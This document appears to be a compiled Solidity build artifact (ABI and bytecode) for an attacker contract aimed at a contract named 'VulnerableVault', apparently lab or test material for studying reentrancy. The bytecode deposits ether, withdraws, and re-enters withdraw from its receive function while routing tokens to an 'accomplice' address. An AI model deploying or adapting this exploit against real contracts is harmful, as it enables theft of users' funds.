{"abi":[{"type":"constructor","inputs":[{"name":"_vault","type":"address","internalType":"address"},{"name":"_accomplice","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"accomplice","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"attackStep","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"getBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"vault","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract VulnerableVault"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561000f575f5ffd5b5060405161090e38038061090e83398181016040528101906100319190610115565b815f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508060015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050610153565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e4826100bb565b9050919050565b6100f4816100da565b81146100fe575f5ffd5b50565b5f8151905061010f816100eb565b92915050565b5f5f6040838503121561012b5761012a6100b7565b5b5f61013885828601610101565b925050602061014985828601610101565b9150509250929050565b6107ae806101605f395ff3fe60806040526004361061004d575f3560e01c806312065fe0146102d95780637a164584146103035780639e5faafc1461032d578063d12fd49a14610337578063fbfa77cf14610361576102d5565b366102d5575f6002541480156100f957505f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166327e235e3306040518263ffffffff1660e01b81526004016100b89190610565565b602060405180830381865afa1580156100d3573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100f791906105b5565b115b156102d35760016002819055505f60025f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166327e235e3306040518263ffffffff1660e01b81526004016101629190610565565b602060405180830381865afa15801561017d573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101a191906105b5565b6101ab919061060d565b90505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836040518363ffffffff1660e01b815260040161022992919061064c565b5f604051808303815f87803b158015610240575f5ffd5b505af1158015610252573d5f5f3e3d5ffd5b505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156102bb575f5ffd5b505af11580156102cd573d5f5f3e3d5ffd5b50505050505b005b5f5ffd5b3480156102e4575f5ffd5b506102ed61038b565b6040516102fa9190610673565b60405180910390f35b34801561030e575f5ffd5b50610317610392565b6040516103249190610673565b60405180910390f35b610335610398565b005b348015610342575f5ffd5b5061034b6104dd565b6040516103589190610565565b60405180910390f35b34801561036c575f5ffd5b50610375610502565b60405161038291906106e7565b60405180910390f35b5f47905090565b60025481565b671bc16d674ec800003410156103e3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103da9061075a565b60405180910390fd5b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b158015610449575f5ffd5b505af115801561045b573d5f5f3e3d5ffd5b50505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156104c5575f5ffd5b505af11580156104d7573d5f5f3e3d5ffd5b50505050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61054f82610526565b9050919050565b61055f81610545565b82525050565b5f6020820190506105785f830184610556565b92915050565b5f5ffd5b5f819050919050565b61059481610582565b811461059e575f5ffd5b50565b5f815190506105af8161058b565b92915050565b5f602082840312156105ca576105c961057e565b5b5f6105d7848285016105a1565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61061782610582565b915061062283610582565b925082610632576106316105e0565b5b828204905092915050565b61064681610582565b82525050565b5f60408201905061065f5f830185610556565b61066c602083018461063d565b9392505050565b5f6020820190506106865f83018461063d565b92915050565b5f819050919050565b5f6106af6106aa6106a584610526565b61068c565b610526565b9050919050565b5f6106c082610695565b9050919050565b5f6106d1826106b6565b9050919050565b6106e1816106c7565b82525050565b5f6020820190506106fa5f8301846106d8565b92915050565b5f82825260208201905092915050565b7f4e656564206174206c65617374203220657468657200000000000000000000005f82015250565b5f610744601583610700565b915061074f82610710565b602082019050919050565b5f6020820190508181035f83015261077181610738565b905091905056fea2646970667358221220e2abf97e9a1d87f841f448a471b0b6f795ec89c8cd19fd4eb61f1be7c0c64d9a64736f6c63430008210033","linkReferences":{}},"methodIdentifiers":{"accomplice()":"d12fd49a","attack()":"9e5faafc","attackStep()":"7a164584","getBalance()":"12065fe0","vault()":"fbfa77cf"},"id":19}